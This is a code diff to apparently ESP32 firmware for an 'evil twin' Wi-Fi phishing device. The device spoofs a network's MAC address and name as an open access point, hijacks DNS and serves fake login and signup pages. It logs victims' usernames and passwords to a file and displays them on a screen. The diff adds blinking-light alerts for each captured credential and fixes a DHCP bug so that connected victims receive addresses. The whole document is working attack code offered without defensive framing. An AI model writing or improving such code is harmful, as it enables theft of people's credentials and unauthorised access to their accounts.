@@ -374,6 +374,26 @@ IPAddress  apIP(192,168,4,1);
 int        livePage    = 0;
 unsigned long twinStarted = 0;
 
+// ── Capture visual effects (all non-blocking) ────────────
+// Green: hold on for 3 s after capture
+unsigned long greenUntil = 0;
+
+// Yellow: rapid pulse — N half-periods at 50 ms each
+int           yellowLeft = 0;
+bool          yellowOn   = false;
+unsigned long yellowNext = 0;
+
+// Blue: flash N times (N = connected clients), 1 s pause between bursts
+enum BluePhase { BP_PAUSE, BP_ON, BP_OFF };
+BluePhase     bluePhase    = BP_PAUSE;
+int           blueFlashLeft= 0;
+unsigned long blueNext     = 0;
+
+// OLED: suppress normal draw and flash white twice on capture
+bool          oledFlashing  = false;
+int           oledFlashLeft = 0;
+unsigned long oledFlashNext = 0;
+
 #define MAX_CRED_LINES 20
 char credLines[MAX_CRED_LINES][64];
 int  credLineCount=0, credLineScroll=0;
@@ -387,6 +407,83 @@ void loadCredsOLED() {
     if(ln.length()>0) strlcpy(credLines[credLineCount++],ln.c_str(),63);
   }
   f.close();
+}
+
+// Called by every credential capture (login or signup)
+void onCapture() {
+  // Green: solid on for 3 seconds
+  greenUntil = millis() + 3000;
+  digitalWrite(LED_GREEN, HIGH);
+
+  // Yellow: 12 half-periods × 50 ms = 6 rapid pulses
+  yellowLeft = 12;
+  yellowOn   = false;
+  yellowNext = millis();
+
+  // OLED: flash white twice (4 half-periods × 120 ms)
+  oledFlashLeft = 4;
+  oledFlashNext = millis();
+  oledFlashing  = true;
+}
+
+// Non-blocking LED/OLED effects — call every loop iteration
+void tickEffects() {
+  unsigned long now = millis();
+
+  // ── Green hold ────────────────────────────────────────
+  if(greenUntil && now >= greenUntil) {
+    greenUntil = 0;
+    digitalWrite(LED_GREEN, LOW);
+  }
+
+  // ── Yellow rapid pulse ────────────────────────────────
+  if(yellowLeft > 0 && now >= yellowNext) {
+    yellowOn = !yellowOn;
+    digitalWrite(LED_YELLOW, yellowOn ? HIGH : LOW);
+    yellowNext = now + 50;
+    if(--yellowLeft == 0) digitalWrite(LED_YELLOW, LOW);
+  }
+
+  // ── Blue N-flash (only while twin is live) ────────────
+  if(twinActive && now >= blueNext) {
+    switch(bluePhase) {
+      case BP_PAUSE:
+        blueFlashLeft = max(1, (int)WiFi.softAPgetStationNum());
+        bluePhase     = BP_ON;
+        digitalWrite(LED_BLUE, HIGH);
+        blueNext = now + 150;
+        break;
+      case BP_ON:
+        digitalWrite(LED_BLUE, LOW);
+        bluePhase = BP_OFF;
+        blueNext  = now + 150;
+        break;
+      case BP_OFF:
+        if(--blueFlashLeft > 0) {
+          bluePhase = BP_ON;
+          digitalWrite(LED_BLUE, HIGH);
+          blueNext = now + 150;
+        } else {
+          bluePhase = BP_PAUSE;
+          blueNext  = now + 1000;
+        }
+        break;
+    }
+  }
+
+  // ── OLED white flash (2 flashes = 4 half-periods) ────
+  if(oledFlashing && now >= oledFlashNext) {
+    if(oledFlashLeft > 0) {
+      display.clearDisplay();
+      if(oledFlashLeft % 2 == 0)  // even counts = white
+        display.fillRect(0, 0, SCREEN_W, SCREEN_H, SSD1306_WHITE);
+      display.display();
+      oledFlashNext = now + 120;
+      oledFlashLeft--;
+    } else {
+      oledFlashing = false;
+    }
+  }
 }
 
 // Serve a template replacing ##COLOR## ##BRAND## ##TAG##
@@ -406,42 +503,29 @@ void servePage(const char* tpl) {
 void startTwin() {
   SPIFFS.begin(true);
 
-  // --- Reliable WiFi setup ---
-  // Stop everything cleanly first
+  // --- WiFi init (Arduino-first to avoid double-init / no-DHCP bug) ---
+  // Previous approach called esp_wifi_init() manually after WiFi.mode(WIFI_OFF)
+  // which deinits WiFi. When softAP() later called wifi_init_if_needed() it saw
+  // _initialized=false and called esp_wifi_init() again → corrupted state → no DHCP.
+  // Fix: let Arduino own the init, then use IDF only to stop/set-MAC/restart.
   WiFi.softAPdisconnect(true);
   WiFi.disconnect(true);
   WiFi.mode(WIFI_OFF);
-  delay(150);
-
-  // IDF-level init so we can set MAC before start
-  wifi_init_config_t cfg=WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
-
-  // Set spoofed MAC before esp_wifi_start (required by IDF)
+  delay(200);
+  WiFi.mode(WIFI_AP);     // Arduino init path — sets _initialized=true
+  delay(100);
+  // Radio is now running. Stop it, spoof the MAC, restart.
+  // Arduino's _initialized flag stays true so softAP() won't double-init.
+  esp_wifi_stop();
   esp_wifi_set_mac(WIFI_IF_AP, twinBSSID);
-  esp_wifi_set_mode(WIFI_MODE_AP);
-
-  // Set SSID / channel at IDF level BEFORE starting — this is what
-  // actually determines what devices see on a scan
-  wifi_config_t ap_cfg = {};
-  strlcpy((char*)ap_cfg.ap.ssid, twinSSID, 32);
-  ap_cfg.ap.ssid_len     = (uint8_t)strlen(twinSSID);
-  ap_cfg.ap.channel      = twinChannel;
-  ap_cfg.ap.max_connection = 4;
-  ap_cfg.ap.authmode     = WIFI_AUTH_OPEN;
-  esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
-
   esp_wifi_start();
   delay(100);
-
-  // Arduino wrapper: sets IP config AND starts the DHCP server.
-  // Without softAP() clients associate but never get an IP address.
+  // softAPConfig + softAP configures SSID/channel AND starts the DHCP server.
   WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
   WiFi.softAP(twinSSID, "", twinChannel, 0, 4);
-  delay(300); // let AP and DHCP server fully initialise before DNS
+  delay(500);  // DHCP server needs time to come up before DNS starts
 
-  wifiInited = false; // will re-init cleanly on next scan
+  wifiInited = false;
 
   // --- DNS + HTTP ---
   dnsServer.start(53, "*", apIP);
@@ -451,7 +535,7 @@ void startTwin() {
     String u=httpServer.arg("u"), p=httpServer.arg("p");
     File f=SPIFFS.open("/creds.txt",FILE_APPEND);
     if(f){ f.printf("[LOGIN  %5lus] %-30s : %s\n",millis()/1000,u.c_str(),p.c_str()); f.close(); }
-    credCount++; digitalWrite(LED_GREEN,HIGH); delay(40); digitalWrite(LED_GREEN,LOW);
+    credCount++; onCapture();
     httpServer.sendHeader("Location","/?e=1"); httpServer.send(302);
   });
   httpServer.on("/signup", HTTP_GET, []{ servePage(SIGNUP_TPL); });
@@ -461,7 +545,7 @@ void startTwin() {
     File f=SPIFFS.open("/creds.txt",FILE_APPEND);
     if(f){ f.printf("[SIGNUP %5lus] %-15s %-15s | %-25s : %s\n",
                     millis()/1000,fn.c_str(),ln.c_str(),u.c_str(),p.c_str()); f.close(); }
-    credCount++; digitalWrite(LED_GREEN,HIGH); delay(40); digitalWrite(LED_GREEN,LOW);
+    credCount++; onCapture();
     httpServer.sendHeader("Location","/?m=1"); httpServer.send(302);
   });
   httpServer.on("/creds", HTTP_GET, []{
@@ -500,6 +584,9 @@ void stopTwin() {
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_OFF);
   wifiInited=false;
+  // Reset all effect state
+  greenUntil=0; yellowLeft=0; oledFlashing=false; oledFlashLeft=0;
+  bluePhase=BP_PAUSE; blueNext=0;
   twinActive=false; ledsOff();
   state=TS_SELECT;
 }
@@ -589,6 +676,7 @@ void drawSelect() {
 }
 
 void drawLive() {
+  if(oledFlashing) return;  // tickEffects owns the display during flash
   oledClear();
   char hdr[22]; snprintf(hdr,22,"LIVE [%d cred%s]",credCount,credCount==1?"":"s");
   oledHeader(hdr);
@@ -640,6 +728,7 @@ void drawLive() {
 }
 
 void drawCreds() {
+  if(oledFlashing) return;
   oledClear();
   char hdr[22]; snprintf(hdr,22,"CREDS [%d]",credLineCount);
   oledHeader(hdr);
@@ -749,6 +838,7 @@ void setup() {
 void loop() {
   updateBoot();
   checkSwitches();
+  tickEffects();
 
   switch(state) {
 
